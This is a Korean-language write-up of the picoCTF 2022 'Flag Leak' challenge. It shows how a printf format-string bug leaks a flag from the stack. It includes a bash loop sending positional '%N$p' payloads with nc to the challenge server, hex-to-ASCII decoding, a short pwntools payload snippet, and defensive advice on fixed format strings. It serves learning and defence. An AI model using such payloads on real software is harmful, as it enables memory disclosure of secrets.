---
title: Flag Leak — picoCTF 2022 pwn writeup
created: 2026-06-15
updated: 2026-06-16
type: query
tags: [ctf, pwn, format-string, stack-leak, printf, picoctf]
sources: [https://ctftime.org/writeup/32816, https://picoctf2022.haydenhousen.com/binary-exploitation/flag-leak, https://medium.com/@zeyadsalah686/flag-leak-picoctf-writeup-e7b53f3273e2, https://medium.com/@sparshladani/picoctf-challenges-flag-leak-758bbed42e2d]
confidence: high
---

# Flag Leak — picoCTF 2022 pwn writeup

> `Flag Leak`은 **printf 형식 문자열 취약점(format string vulnerability)** 으로 스택에 올라간 `flag.txt` 내용을 읽어내는 picoCTF 2022 Binary Exploitation 문제입니다. 핵심은 버퍼 오버플로가 아니라 **`printf(user_input)` 호출로 인한 스택 읽기**입니다.

## 1. 핵심 요약

- 프로그램은 `flag.txt` 내용을 메모리로 읽어 둡니다.
- 사용자의 입력을 `printf()`에 그대로 넘기므로 포맷 문자열이 해석됩니다.
- `%p`, `%x`, `%s`, positional specifier(`%36$p`)를 이용해 스택 값을 읽을 수 있습니다.
- 스택에서 flag 조각이 보이면 hex → ASCII로 복원합니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2022 |
| 분류 | pwn / binary exploitation |
| 핵심 요소 | format string, stack leak, positional specifier |
| 입력 | 사용자 문자열 |
| 목표 | 스택에 있는 flag 문자열 유출 |

## 3. 공격 흐름

1. 로컬 또는 원격에서 사용자 입력이 그대로 출력되는지 확인합니다.
2. `%p %p %p` 같은 페이로드로 포맷 문자열 취약점을 검증합니다.
3. `%1$p`부터 `%64$p`까지 위치 인자를 늘려가며 flag 조각이 나오는 지점을 찾습니다.
4. `0x6f636970` 같은 hex를 ASCII로 복원합니다.
5. 조각들을 이어 붙여 최종 flag를 얻습니다.

## 4. 실전 탐색 예시

```bash
# 1부터 64까지 포지셔널 인자를 시도해 flag 조각이 나오는 위치를 찾습니다.
for i in $(seq 1 64); do
  echo "%${i}\$p" | nc saturn.picoctf.net 49245  # 예상: 일부 위치에서 0x6f636970 같은 값이 출력됩니다.
done
```

```bash
# hex 조각을 ASCII로 변환합니다.
echo '6f6369707b465443...' | xxd -r -p  # 예상: picoCTF{... 형태의 문자열 일부가 출력됩니다.
```


## 재현 절차

1. 형식 문자열 취약 여부를 확인합니다.
```bash
# 프로그램이 사용자 입력을 printf 계열로 직접 출력하는지 봅니다.
./vuln                   # 예상: 입력을 받아 출력하는 프롬프트가 나타납니다.
```
2. 포인터와 문자열을 누출하는 payload를 보냅니다.
```python
# %p / %s를 이용한 정보 누출 예시입니다.
from pwn import *
payload = b"%p.%p.%p.%p"   # 예상: 스택 포인터들이 출력됩니다.
print(payload.decode())
```
3. 누출값으로 flag 위치를 찾아 출력합니다.
## 5. 방어 관점 메모

- `printf(user_input)`는 금지해야 합니다.
- 항상 `printf("%s", user_input)`처럼 고정 포맷을 사용해야 합니다.
- 컴파일 시 `-Wformat-security`를 켜면 이런 실수를 줄일 수 있습니다.

## 6. 비교 포인트

- `PIE TIME`은 **주소 계산형 pwn**입니다.
- `Flag Leak`은 **정보 누출형 pwn**입니다.
- 둘 다 정보가 중요하지만, 전자는 제어 흐름 점프, 후자는 메모리 읽기에 초점이 있습니다.

## 7. 참고 자료

- [CTFtime — picoCTF 2022 / flag leak / Writeup](https://ctftime.org/writeup/32816)
- [Hayden Housen — picoCTF 2022 flag leak](https://picoctf2022.haydenhousen.com/binary-exploitation/flag-leak)
- [Zeyad Salah — Flag leak PicoCTF Writeup](https://medium.com/@zeyadsalah686/flag-leak-picoctf-writeup-e7b53f3273e2)
- [Sparsh Ladani — PicoCTF Challenges: Flag Leak](https://medium.com/@sparshladani/picoctf-challenges-flag-leak-758bbed42e2d)
- [[format-string-ctf-patterns]]
- [[exploitation]]
